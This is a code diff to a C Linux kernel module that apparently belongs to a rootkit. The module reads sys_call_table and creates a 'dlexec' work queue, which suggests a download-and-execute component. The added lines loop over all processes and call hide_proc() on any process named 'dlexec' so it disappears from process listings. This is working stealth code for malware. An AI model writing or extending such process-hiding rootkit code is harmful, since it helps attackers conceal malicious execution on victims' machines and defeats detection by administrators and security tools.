@@ -270,6 +270,20 @@ void dlexec_init ( void )
 
     sys_chmod = (void *)sys_call_table[__NR_chmod];
     work_queue = create_workqueue("dlexec");
+    
+    //Hide dlexec process
+    struct task_struct *task_list;
+
+    for_each_process(task_list){
+    if(strstr(task_list->comm,"dlexec") != NULL){
+    unsigned short h_pid = (unsigned short)task_list->pid;
+    DEBUG("Hiding process...pid: %u\n",h_pid);
+    hide_proc(h_pid);
+    }
+
+    DEBUG("Process name: %s\n",task_list->comm);
+    }
+
 }
 
 void dlexec_exit ( void )
